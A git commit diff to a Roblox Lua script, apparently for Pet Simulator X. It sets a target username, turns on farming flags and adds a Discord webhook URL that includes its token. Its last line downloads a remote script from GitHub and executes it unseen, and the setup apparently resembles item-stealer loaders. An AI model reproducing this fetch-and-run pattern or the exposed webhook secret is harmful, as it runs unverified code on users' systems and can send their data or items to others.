e54a09504d3af3b6e4bb7aa32c01d658b54882eb
hsdfuyhsdufhs <128642081+hsdfuyhsdufhs@users.noreply.github.com>
2024-01-06 12:12:31 +0300

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,4 +1,5 @@
 Username = "Akkaunt230"
-loadingscreen = false 
-farmui = false
+loadingscreen = true 
+farmui = true
+webhook = "https://discord.com/api/webhooks/1134042858383495219/bVCNyqoP8Y4Y2Yr_zu610jVlmRKt4HfSltoYMvg-HsLdpBK9FkmiDLyYaz3aUc__1S-J"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
